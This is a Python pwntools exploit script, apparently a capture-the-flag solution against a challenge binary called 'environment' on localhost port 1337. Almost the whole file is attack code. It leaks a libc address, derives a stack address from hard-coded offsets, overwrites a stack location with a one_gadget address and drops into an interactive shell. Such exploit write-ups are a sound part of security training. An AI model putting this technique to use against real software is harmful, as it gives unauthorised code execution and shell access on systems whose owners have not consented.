#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 environment
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('environment')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

for i in range(5):
    io.recvuntil(">")
    io.sendline("2")
    io.recvuntil(">")
    io.sendline("2")
    io.recvuntil(">")
    io.sendline("n")

io.recvuntil("gift: \x1b[0m[")
leak0 = io.recvuntil("]", drop=True)
libc.address = int(leak0, 0) - libc.sym["printf"]
io.success("libc: {}".format(hex(libc.address)))

stackptr = libc.address + (0x7f951407e5a0 - 0x7f9513c8e000)

for i in range(5):
    io.recvuntil(">")
    io.sendline("2")
    io.recvuntil(">")
    io.sendline("2")
    io.recvuntil(">")
    io.sendline("n")

io.recvuntil(">")
io.sendline(str(stackptr))

io.recvuntil("\x1b[0m")
leak1 = io.recvuntil("\n", drop=True)

stack = u64(leak1.ljust(8, b'\x00')) - (0x7ffe64ffb388 - 0x7ffe64ffb278)
io.success("stack: {}".format(hex(stack)))

one_gadget = libc.address + 0x4f3d5

io.recvuntil(">")
io.sendline("1")
io.recvuntil(">")
io.sendline(str(stack))
io.recvuntil(">")
io.sendline(str(one_gadget))

io.interactive()

